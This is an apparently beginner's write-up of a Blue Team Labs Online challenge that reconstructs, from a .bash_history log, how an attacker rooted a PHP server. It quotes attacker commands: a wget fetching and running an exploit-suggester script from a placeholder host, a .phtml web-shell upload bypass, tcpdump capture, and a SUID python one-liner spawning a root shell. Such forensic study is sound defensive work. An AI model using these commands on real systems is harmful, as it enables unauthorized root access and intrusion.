🔐 BTLO Challenge: Privilege Escalation (Log Analysis)
This repository contains my beginner-friendly walkthrough of Linux privilege escalation techniques using a virtual lab setup. I explored how to escalate from a normal user to root by exploiting misconfigurations like SUID binaries, sudo permissions, and writable system files. All steps are documented for learning and practice purposes.

This repository documents my solution and analysis of the **Privilege Escalation (Log Analysis)** challenge on [Blue Team Labs Online](https://blueteamlabs.online). In this challenge, I analyzed a `.bash_history` log to trace how an attacker gained unauthorized **root access** on a compromised PHP server.


## 🧩 Challenge Overview

A web server running PHP was compromised, and sensitive data — accessible only to `root` — was leaked. The only evidence provided was a `bash_history` log file. My task was to:

- Analyze the attacker's commands
- Identify how they **escalated privileges**
- Determine which tools and techniques were used



## 🔍 Key Findings

### 👤 1. User Discovery
- The attacker explored `/home/daniel`, revealing a second user account:
  
  ```bash
  cd /home/daniel
  ls -la



⬇️ 2. Exploitation Script Downloaded

They downloaded linux-exploit-suggester.sh, a known privilege escalation enumeration tool:

wget http://<url>/linux-exploit-suggester.sh -O /tmp/suggester.sh
chmod +x /tmp/suggester.sh
./tmp/suggester.sh


📡 3. Network Analysis Using Tcpdump

The attacker used tcpdump, suggesting they were monitoring or capturing network traffic:

tcpdump -i any -nn port 80



🐚 4. Web Shell Bypass Using .phtml

They uploaded a .phtml file — a common trick to bypass .php upload restrictions:

upload.php?file=shell.phtml

This was likely used to establish a web shell before moving to a reverse shell.



🚩 5. Privilege Escalation via SUID Python

The attacker exploited a misconfigured SUID binary — /usr/bin/python — to gain root:

/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

This method is listed on GTFOBins, confirming the privilege escalation technique.




📸 Screenshots

This folder contains supporting screenshots:

linexploit-output.png

suid-python-root.png

tcpdump-use.png

final-whoami-root.png


📁 Folder: /screenshots/




📈 Summary of Attack Flow

1. Gained access via uploaded .phtml web shell

2. Performed local enumeration

3. Discovered user daniel and potential privilege escalation paths

4. Downloaded and ran Linux Exploit Suggester

5. Identified SUID-enabled Python

6. Gained root access using Python SUID GTFOBins method


🔐 Lessons Learned

Logs reveal everything — even .bash_history can expose full attack chains.

SUID misconfigurations are a major privilege escalation vector.

Tools like tcpdump can be used maliciously in post-exploitation scenarios.

Web upload bypasses using extensions like .phtml are still relevant.


📚 References

GTFOBins – Python SUID

PEASS-ng

Linux Exploit Suggester

StumbleSec BTLO Walkthrough

ERBATMAN BTLO Writeup

YouTube on BTLO


✨ Author
Rasheedah Haruna
Beginner Cybersecurity Enthusiast | Log Analyst | PrivEsc Explorer
📬 Connect with me on LinkedIn(www.linkedin.com/in/haruna-rasheedah-62622730b)

🛡️ Educational Purpose Only — Always practice ethical hacking in legal environments.
